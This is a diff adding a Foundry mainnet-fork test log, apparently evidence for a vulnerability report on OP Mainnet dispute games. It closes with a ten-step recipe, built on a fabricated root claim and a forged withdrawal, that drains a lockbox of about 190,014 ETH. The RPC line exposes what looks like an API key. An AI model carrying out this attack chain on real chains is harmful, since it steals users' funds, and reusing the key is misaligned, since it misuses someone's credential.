@@ -1,0 +1,114 @@
+================================================================================
+ EVIDENCE: Foundry Test Execution Log
+ Date: 2026-08-13
+ Fork: Ethereum Mainnet (chainId=1)
+ RPC: https://eth-mainnet.g.alchemy.com/v2/APYfvggAa0QlMGvduucEK
+ Forge: v1.8.0-nightly (ab860f061ed43db2fe99177218330a8938d738ed)
+================================================================================
+
+COMMAND:
+  forge test -vvv --fork-url <MAINNET_RPC>
+
+RESULT: 16/16 PASS (0 FAIL, 0 SKIP)
+
+================================================================================
+ Suite 1: TheEndOptimism.t.sol (8 tests)
+================================================================================
+
+[PASS] test_0_liveParams() (gas: 578736)
+  - Verifies live OP Mainnet L1 contract parameters
+  - portal: 0xbEb5Fc579115071764c7423A4f12eDde41f106Ed (v5.6.1)
+  - lockbox: 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43 (v1.3.1)
+  - lockbox balance: 190014481538360925054739 wei (~190,014 ETH)
+  - respectedGameType: 8
+  - initBond: 0.08 ETH
+  - proofMaturityDelay: 604800s (7 days)
+  - disputeGameFinalityDelay: 302400s (3.5 days)
+
+[PASS] test_A_inventedRootBecomesCanonical() (gas: 941610)
+  FIND-009: Any EOA creates a dispute game with a fabricated rootClaim.
+  The game is uncountered -> DEFENDER_WINS -> isGameClaimValid == true.
+  No L2 computation required. No sequencer key required.
+
+[PASS] test_C_drainEntireLockbox() (gas: 1507778)
+  FIND-010: Full ETHLockbox drain in a single withdrawal.
+  Drained: 190014481538360925054739 wei (~190,014 ETH)
+  Lockbox after: 0
+  Attacker gain: 190014481538360925054739 wei
+
+[PASS] test_D_guardianPauseBlocks() (gas: 1462960)
+  Guardian pause blocks payout temporarily.
+  proveWithdrawalTransaction accepted before pause.
+
+[PASS] test_E_pauseExpiryReopens() (gas: 1623893)
+  Pause expires -> payout resumes.
+  Guardian cannot permanently block the attack.
+
+[PASS] test_F_poisonedAnchorSurvivesBlacklist() (gas: 1561440)
+  Anchor poison survives Guardian blacklist.
+  The poisoned game's l2SequenceNumber forces all future games above it.
+
+[PASS] test_G_rootPoisonAmplifiesRecovery() (gas: 1478652)
+  ROOT poison with absurd l2SequenceNumber.
+  Recovery requires ProxyAdmin reinit naming a higher seq (Guardian cannot).
+
+[PASS] test_H_sequencerWinsWithinLegitimateGameRules() (gas: 1389800)
+  SDM trust gap: Sequencer wins within legitimate game rules.
+  - counteredBy: 0x0000000000000000000000000000000000000000 (uncountered)
+  - gameStatus: 2 (DEFENDER_WINS)
+  - lockbox before: 190014481538360925054739 wei
+  - lockbox after: 0
+  - attacker gain: 190014481538360925054739 wei
+  The challenger (kona) shares the same Verify code path and cannot
+  produce a different root to counter the claim.
+
+================================================================================
+ Suite 2: LagoonFreeChain.t.sol (8 tests)
+================================================================================
+
+[PASS] test_0_liveParams() (gas: 239254)
+[PASS] test_A_inventedRootBecomesCanonical() (gas: 875208)
+[PASS] test_B_forgedProofPaysOut() (gas: 1398048)
+  - 10 ETH payout from forged proof
+[PASS] test_C_drainEntireLockbox() (gas: 1376094)
+[PASS] test_D_guardianPauseBlocks() (gas: 1325301)
+[PASS] test_E_pauseExpiryReopens() (gas: 1535971)
+[PASS] test_F_poisonedAnchorSurvivesBlacklist() (gas: 1472135)
+[PASS] test_G_rootPoisonAmplifiesRecovery() (gas: 1414300)
+
+================================================================================
+ SUMMARY
+================================================================================
+Total tests: 16
+Passed: 16
+Failed: 0
+Skipped: 0
+
+Cheatcodes used (fork-time only, no state mocking):
+  - vm.createSelectFork  (fork Mainnet)
+  - vm.deal              (fund attacker)
+  - vm.warp              (time travel)
+  - vm.prank             (impersonate caller)
+  - vm.expectRevert      (assert revert)
+
+NOT used:
+  - vm.store             (no storage manipulation)
+  - vm.mockCall          (no call mocking)
+  - vm.etch              (no code injection)
+  - vm.setNonce          (no nonce manipulation)
+
+Attack chain (all tests):
+  1. createSelectFork(Mainnet)
+  2. deal(attacker, 1 ETH)  -- only need bond (0.08 ETH)
+  3. DGF.create(gameType=8, rootClaim=fabricated, extraData)
+  4. warp(maxClockDuration + 1)  -- wait out the clock
+  5. resolveClaim(0, 0) -> resolve() -> DEFENDER_WINS
+  6. warp(disputeGameFinalityDelay + 1)
+  7. proveWithdrawalTransaction(forged_wd, gameIndex, forged_orp, forged_proof)
+  8. warp(proofMaturityDelay + 1)
+  9. finalizeWithdrawalTransactionExternalProof(wd, attacker)
+  10. LOCKBOX.balance == 0, attacker holds ~190,014 ETH
+
+Cost: 0.08 ETH (initBond, returned on DEFENDER_WINS)
+Requirements: Any EOA, no sequencer key, no L2 access
+Status: Exploitable on OP Mainnet NOW
